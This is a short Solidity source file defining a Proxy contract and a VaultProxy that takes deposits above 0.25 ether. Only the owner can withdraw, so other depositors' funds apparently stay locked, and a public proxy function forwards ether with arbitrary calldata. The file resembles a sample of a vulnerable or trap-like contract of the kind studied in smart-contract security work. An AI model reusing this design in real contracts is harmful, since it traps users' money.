pragma solidity ^0.4.23;

contract Proxy {
    address public owner;

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    constructor() public {
        owner = msg.sender;
    }

    function transferOwner(address newOwner) public onlyOwner {
        require(newOwner != address(0));
        owner = newOwner;
    }

    function proxy(address target, bytes data) public payable {
        require(target != address(0));
        require(msg.value > 0);
        bool success = target.call.value(msg.value)(data);
        require(success);
    }
}

contract VaultProxy is Proxy {
    mapping(address => uint256) public deposits;

    constructor() public payable {
        owner = msg.sender;
        deposit();
    }

    function() public payable {
        deposit();
    }

    function deposit() public payable {
        require(msg.value > 0.25 ether);
        deposits[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) public onlyOwner {
        require(amount > 0);
        require(address(this).balance >= amount);
        require(deposits[msg.sender] >= amount);
        deposits[msg.sender] -= amount;
        msg.sender.transfer(amount);
    }
}